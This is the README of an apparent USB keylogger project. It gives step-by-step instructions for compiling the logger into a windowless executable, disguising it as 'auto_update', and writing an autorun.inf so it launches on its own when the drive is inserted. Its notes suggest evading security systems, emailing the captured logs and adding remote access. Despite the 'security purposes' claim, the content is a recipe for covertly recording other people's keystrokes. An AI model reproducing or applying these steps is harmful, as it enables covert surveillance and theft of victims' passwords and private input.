
# USB Key logger

Source code for a simple key logger application that can be executed via pendrive to monitor key strokes for security purposes.
Each keystroke is encrypted and then transferred to log file. 
Log file needs to be decrypted using decoder file. 



## One way to use:

1. Clone/ Download repository.
2. Install all script dependencies.
```
python install -r requirements.txt
```
3. Convert main.py file to .exe file:
```
pip install pyinstaller
```
Open powershell window in the same repository. Type -
```
pyinstaller --onefile -w 'main.py'
```
4. Executable file will be present in build folder. Change the file name to "auto_update". Copy executable file and paste it in your external drive.
5. Open any text editor (preferably notepad). Type in - 
```
[autorun]; 
Open = auto_update.exe 
ShellExecute = auto_update.exe 
UseAutoPlay = 1
```
6. Make sure save as type is set to "All files" (without double quotes). Save the file as "autorun.inf" (without double quotes) in the same repository as executable file (auto_update.exe).






## Notes

- This will most possibly not work for latest versions of Windows and Mac.
- You will have to allow access to your external usb drive explicitly.
- Or script better to evade current security systems.
- You can change the code to mail the log file. (But this activity will be logged into the device firewall)
- Or create a more complex code to remotely access the log file.
- Also you can create a system to access keystrokes in realtime.
